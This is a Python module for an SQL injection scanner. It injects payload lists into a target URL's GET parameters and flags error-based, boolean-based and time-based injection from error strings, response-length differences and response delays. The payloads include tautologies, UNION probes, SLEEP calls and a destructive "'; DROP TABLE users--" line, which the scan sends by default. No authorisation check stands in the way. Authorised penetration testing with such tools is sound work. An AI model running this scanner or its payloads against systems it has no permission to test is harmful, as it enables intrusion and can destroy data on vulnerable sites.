#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class SQLiScanner:
    def __init__(self, target, verbose=False):
        self.target = target
        self.verbose = verbose
        self.results = []
        
        # Error-based payloads
        self.error_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' AND 1=1--",
            "' AND 1=2--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "'; DROP TABLE users--",
            "1' AND SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#"
        ]
        
        # Boolean-based payloads
        self.bool_payloads = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("' OR '1'='1", "' OR '1'='2")
        ]
        
        # Time-based payloads
        self.time_payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "1' OR SLEEP(5)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        
        self.error_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"ORA-[0-9]{5}",
            r"PostgreSQL.*ERROR",
            r"SQLite/JDBCDriver",
            r"Microsoft OLE DB",
            r"Microsoft Access",
            r"Driver.*SQL Server",
            r"SQLite3::",
            r"Unclosed quotation mark",
            r"You have an error in your SQL syntax",
            r"Warning: mysql",
            r"Warning: pg_",
            r"DB Error",
            r"SQL command",
            r"invalid query",
            r"Unknown column",
            r"Table '.*' doesn't exist"
        ]

    def extract_params(self):
        parsed = urlparse(self.target)
        if not parsed.query:
            return {}
        return parse_qs(parsed.query)

    def build_url(self, params):
        parsed = urlparse(self.target)
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def test_error_based(self, param, payload):
        """Test for error-based SQL injection"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            for pattern in self.error_patterns:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    result = {
                        "type": "error_based",
                        "param": param,
                        "payload": payload,
                        "url": test_url,
                        "pattern": pattern,
                        "status": resp.status_code
                    }
                    self.results.append(result)
                    log_success(f"🔥 Error-based SQLi found on {param} with payload: {payload}")
                    return True
        except Exception as e:
            if self.verbose:
                log_debug(f"Error testing {param}: {e}")
        return False

    def test_boolean_based(self, param, true_payload, false_payload):
        """Test for boolean-based blind SQL injection"""
        params = self.extract_params()
        if param not in params:
            return False

        # Test true condition
        params_true = params.copy()
        params_true[param] = [true_payload]
        url_true = self.build_url(params_true)

        # Test false condition
        params_false = params.copy()
        params_false[param] = [false_payload]
        url_false = self.build_url(params_false)

        try:
            resp_true = requests.get(url_true, timeout=10)
            resp_false = requests.get(url_false, timeout=10)
            
            # Compare response lengths or content
            if abs(len(resp_true.text) - len(resp_false.text)) > 50:
                result = {
                    "type": "boolean_based",
                    "param": param,
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "true_length": len(resp_true.text),
                    "false_length": len(resp_false.text),
                    "difference": abs(len(resp_true.text) - len(resp_false.text))
                }
                self.results.append(result)
                log_success(f"🔥 Boolean-based SQLi found on {param}")
                return True
        except Exception as e:
            if self.verbose:
                log_debug(f"Error testing boolean: {e}")
        return False

    def test_time_based(self, param, payload):
        """Test for time-based blind SQL injection"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        try:
            start = time.time()
            resp = requests.get(test_url, timeout=10)
            elapsed = time.time() - start
            if elapsed >= 4:  # SLEEP(5) should take ~5 seconds
                result = {
                    "type": "time_based",
                    "param": param,
                    "payload": payload,
                    "elapsed": elapsed,
                    "url": test_url
                }
                self.results.append(result)
                log_success(f"🔥 Time-based SQLi found on {param} with payload: {payload} (took {elapsed:.2f}s)")
                return True
        except Exception as e:
            if self.verbose:
                log_debug(f"Error testing time-based: {e}")
        return False

    def run(self):
        log_info(f"Starting SQL Injection scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning("No GET parameters found. SQLi scan works best with parameters like ?id=1")
            return {"target": self.target, "scan_type": "sqli", "vulnerabilities": []}

        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        
        for param in params.keys():
            log_info(f"Testing parameter: {param}")
            
            # 1. Error-based
            log_info("  Testing Error-based...")
            for payload in self.error_payloads[:10]:
                if self.test_error_based(param, payload):
                    break
            
            # 2. Boolean-based
            log_info("  Testing Boolean-based...")
            for true_payload, false_payload in self.bool_payloads:
                if self.test_boolean_based(param, true_payload, false_payload):
                    break
            
            # 3. Time-based
            log_info("  Testing Time-based...")
            for payload in self.time_payloads[:3]:
                if self.test_time_based(param, payload):
                    break

        log_success(f"SQLi scan completed. Found {len(self.results)} vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "sqli",
            "total_params": len(params),
            "vulnerable_count": len(self.results),
            "vulnerabilities": self.results
        }
